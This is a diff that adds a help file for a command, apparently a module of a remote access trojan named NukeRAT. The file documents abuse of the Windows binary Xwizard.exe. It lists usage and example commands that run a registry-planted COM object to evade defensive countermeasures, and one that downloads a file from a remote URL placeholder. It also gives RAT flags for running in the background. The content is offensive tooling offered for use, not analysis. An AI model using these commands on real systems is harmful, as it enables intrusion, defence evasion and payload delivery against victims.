@@ -1,0 +1,22 @@
+ABOUT
+    Execute custom class that has been added to the registry or
+    download a file with Xwizard.exe. LOLBAS documents run a com
+    object created in registry to evade defensive counter measures
+    and download file from Internet.
+
+USAGE:
+    xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
+    xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
+    xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
+
+EXAMPLES:
+    xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
+    xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC}
+    xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /z{REMOTEURL}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
